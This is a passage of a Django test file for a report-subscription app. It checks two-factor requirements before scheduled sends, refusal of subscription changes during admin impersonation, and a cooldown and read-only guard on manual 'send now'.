    ):
        settings.VANTAGE = {"TWO_FACTOR": True, "TWO_FACTOR_REQUIRED_ROLES": ["Finance"]}
        ada.groups.add(Group.objects.create(name="Finance"))
        run = run_now(make_sub(ada))
        assert run.status == ReportRun.Status.SKIPPED
        assert "Two-factor" in run.reason
        assert not mailoutbox

    def test_an_enrolled_owner_is_sent_to(self, ada, authors, mailoutbox, settings):
        from vantage import twofactor

        settings.VANTAGE = {"TWO_FACTOR": True, "TWO_FACTOR_REQUIRED_ROLES": ["Finance"]}
        ada.groups.add(Group.objects.create(name="Finance"))
        device = twofactor.start_enrolment(ada)
        device.confirmed_at = timezone.now()
        device.save()
        assert run_now(make_sub(ada)).status == ReportRun.Status.SENT

    def test_a_requirement_that_does_not_cover_the_owner_changes_nothing(
        self, ada, authors, mailoutbox, settings
    ):
        settings.VANTAGE = {"TWO_FACTOR": True, "TWO_FACTOR_REQUIRED_ROLES": ["Finance"]}
        assert run_now(make_sub(ada)).status == ReportRun.Status.SENT


class TestImpersonation:
    """A subscription outlives the session: it keeps sending as its owner afterwards."""

    def impersonate(self, client, boss, target):
        from vantage.safety import IMPERSONATE_SESSION_KEY, IMPERSONATOR_SESSION_KEY

        client.force_login(target)
        session = client.session
        session[IMPERSONATE_SESSION_KEY] = target.pk
        session[IMPERSONATOR_SESSION_KEY] = boss.pk
        session.save()

    def test_subscribing_while_impersonating_is_refused(self, client, ada, boss):
        grant_vantage(ada, "send_reports_to_others")
        self.impersonate(client, boss, ada)
        response = subscribe(client, make_view(ada), recipients="outside@example.net")
        assert response.status_code == 403
        assert not ReportSubscription.objects.exists()

    def test_redirecting_a_report_while_impersonating_is_refused(self, client, ada, boss):
        grant_vantage(ada, "send_reports_to_others")
        sub = make_sub(ada, recipients=[])
        self.impersonate(client, boss, ada)
        response = client.post(
            reverse("vantage:report-edit", args=[sub.pk]),
            {
                "frequency": "daily",
                "send_time": "08:00",
                "to_self": "on",
                "recipients": "outside@example.net",
            },
        )
        assert response.status_code == 403
        sub.refresh_from_db()
        assert sub.recipients == []


class TestSendNowGuards:
    def post(self, client, user, sub):
        client.force_login(user)
        return client.post(reverse("vantage:report-send", args=[sub.pk]))

    def test_a_second_click_within_a_minute_is_refused(
        self, client, ada, authors, mailoutbox, django_capture_on_commit_callbacks
    ):
        sub = make_sub(ada)
        with django_capture_on_commit_callbacks(execute=True):
            self.post(client, ada, sub)
            response = self.post(client, ada, sub)
        assert len(mailoutbox) == 1
        assert ReportRun.objects.filter(trigger=ReportRun.Trigger.MANUAL).count() == 1
        follow = client.get(response["Location"])
        assert "Try again in" in follow.content.decode()

    def test_it_is_allowed_again_after_the_cooldown(
        self, client, ada, authors, mailoutbox, django_capture_on_commit_callbacks
    ):
        sub = make_sub(ada)
        with django_capture_on_commit_callbacks(execute=True):
            self.post(client, ada, sub)
        ReportRun.objects.update(created_at=timezone.now() - dt.timedelta(seconds=61))
        with django_capture_on_commit_callbacks(execute=True):
            self.post(client, ada, sub)
        assert len(mailoutbox) == 2

    def test_the_limit_is_per_subscription(
        self, client, ada, authors, mailoutbox, django_capture_on_commit_callbacks
    ):
        first = make_sub(ada)
        second = make_sub(ada, make_view(ada, name="Other"))
        with django_capture_on_commit_callbacks(execute=True):
            self.post(client, ada, first)
            self.post(client, ada, second)
        assert len(mailoutbox) == 2

    def test_scheduled_runs_do_not_count_towards_it(self, ada, authors):
        sub = make_sub(ada)
        ReportRun.objects.create(subscription=sub)
        assert reports.manual_wait(sub) == 0

    @override_settings(VANTAGE={"READ_ONLY": "Maintenance"})
    def test_a_read_only_panel_refuses_it(self, client, ada, authors):
        sub = make_sub(ada)
        assert self.post(client, ada, sub).status_code == 403
        assert not ReportRun.objects.exists()
